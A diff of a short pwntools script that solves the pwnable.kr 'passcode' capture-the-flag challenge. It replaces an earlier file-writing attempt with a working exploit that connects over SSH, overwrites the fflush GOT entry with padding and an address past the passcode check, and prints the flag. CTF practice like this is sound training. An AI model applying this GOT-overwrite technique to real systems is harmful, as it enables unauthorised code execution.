@@ -1,12 +1,21 @@
 from pwn import *
 
-first = 338150
-second = 13371337
+fflushGOTaddress = 0x804a004
+addressAfterPasscodeCheck = 0x080485e3
+padding = b'A'*96
 
-#packing the data
+payload1 = padding + p32(fflushGOTaddress) 
+payload2 = str(addressAfterPasscodeCheck).encode()
 
-#92 A's cause for some reason I can't understand the check of the passcodes is from the last 8 bytes.
-payload = 96* 'A'.encode() +  p32(second) +  p32(first)
+#with open('payload','wb') as file:
+#    file.write(payload)
 
-with open('payload', 'wb') as payload_file:
-    payload_file.write(payload)
+remote = ssh('passcode','pwnable.kr',2222,'guest')
+passcodeProcess = remote.process([],'passcode')
+passcodeProcess.recvline()
+passcodeProcess.sendline(payload1)
+passcodeProcess.recvline()
+passcodeProcess.sendline(payload2)
+rawFlagLine = str(passcodeProcess.recvline())
+flag = rawFlagLine.split(': ')[1][:-3]
+print('FLAG: ' + flag)
